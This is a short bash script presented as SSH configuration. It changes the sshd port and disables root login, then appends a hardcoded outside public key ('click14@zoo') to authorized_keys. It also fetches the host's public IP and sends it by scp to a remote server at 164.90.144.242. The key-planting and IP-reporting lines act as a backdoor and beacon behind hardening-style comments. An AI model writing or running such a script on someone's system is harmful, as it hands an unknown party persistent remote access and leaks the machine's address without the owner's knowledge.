#!/bin/bash

# edit port 
sed '/^#Port/s/22/1488/' -i /etc/ssh/sshd_config
# edit port-#
sed -i 's/#Port/Port/g' -i /etc/ssh/sshd_config
# edit root+#
sed -i 's/PermitRootLogin/#PermitRootLogin/g' -i /etc/ssh/sshd_config
# edit root
sed '/^#PermitRootLogin/s/yes/no/' -i /etc/ssh/sshd_config
# create key ssh
sed -i '$a ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqdjodswNNPn3v9Q+GaOxbXDoEE5UBNo/68wnel2nJ/SqVGp0I5NU6bcOweLvA8EzDpCqOGU+XIQ8rIqq5zlqW69Zeq2bKHAruhbmOhRDHDC8394irXTmaoCfnhTRUkBv0vW+yKQyAHyuqHRUXghDHQRo2nvTEmTlaNwG4WEkDOipCJ10suJngp0I2WEE714WyXGesXF3zq8o2tevH2wOirQyveh9EyGrrgZ2nGllXZIpA95VRMJy+3Uk9YtIfm7uJo2DNdQfWOCRViPEPvburxQUM93WL9TVRrdpbrEvfnId+uP662ytrkzeErjU0NuSkMCqxgGI5ecjugVRKWDu6ri5d2I8XRHQudECEYSt2MFYE3tbspDzk5qKKgAZOpV8mOBBt1Aj1Kiq/gVBYnLlD8Chujpj005becOh0AB7WZjpBLFoXIWjDyLafCJsy7rQslPSWaJp4COCLICKCFJJJ0Ni4ewzhNcgmEDHgg9b2tXrlhQ6hWSXYbzzEoLW+bvU= click14@zoo' ~/.ssh/authorized_keys

apt update
apt install curl -y
curl eth0.me >> ip.txt
scp ip.txt click14@164.90.144.242:/root/zooIP/
